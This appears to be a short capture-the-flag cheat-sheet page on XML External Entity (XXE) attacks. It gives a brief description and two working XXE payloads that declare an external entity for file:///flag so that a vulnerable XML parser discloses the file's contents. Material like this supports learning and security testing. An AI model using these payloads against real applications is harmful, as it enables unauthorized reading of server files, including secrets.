# XXE (XML eXternal Entity)
```
Description: XML External Entity attack: attack against an application that parses XML input and allows XML entities
XML entities can be used to tell the XML parser to fetch specific content on the server
Display the content of the file /flag :

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///flag">
]>
<data>&file;</data>

<?xml version="1.0" encoding="UTF-16"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
```

## Back to README.md
[BACK](/README.md)